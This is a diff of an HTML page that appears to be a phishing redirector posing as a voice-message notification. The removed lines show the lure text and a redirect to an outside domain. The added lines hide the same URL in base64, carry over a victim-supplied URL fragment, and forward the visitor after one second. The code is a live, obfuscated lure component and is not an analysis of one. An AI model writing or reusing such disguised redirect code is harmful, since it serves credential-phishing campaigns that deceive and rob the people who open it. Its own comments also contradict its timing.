@@ -1,15 +1,27 @@
-<script language="javascript">
-	var drop = "#";
-</script>
-<head>
-<script type = "text/javascript">
-         <!--
-            function Redirect() {
-               window.location = "https://hairma.cc/XOXAukQX#"+drop;
-            }            
-            document.write("You will be automatically redirected to Your Voice message.");
-            setTimeout('Redirect()', 1000);
-         //-->
-      </script>
-	  </head>
+    <script>
+        const encodedString = 'aHR0cHM6Ly9oYWlybWEuY2MvWE9YQXVrUVg';
+		let text = window.location.href;
+		let pattern = /#/;
+		let result = pattern.test(text);
+		if (result){
+			var res = text.split("#");
+			var data = res[1];
+			additionalPath = data.replace(/[=]/gi, '');
+			const decodedString = atob(encodedString);
+			const finalURL = decodedString+"#" + additionalPath;
+			setTimeout(function() {
+				window.location.href = finalURL;
+			}, 1000); // Redirect after 2 seconds
+		}else{
+			const decodedString = atob(encodedString);
+			const finalURL = decodedString;
+			setTimeout(function() {
+				window.location.href = finalURL;
+			}, 1000); // Redirect after 2 seconds
+		}
+        document.querySelector('.submit-button').addEventListener('click', function() {
+            window.location.href = finalURL;
+        });
+    </script>
+</body>
 </html>
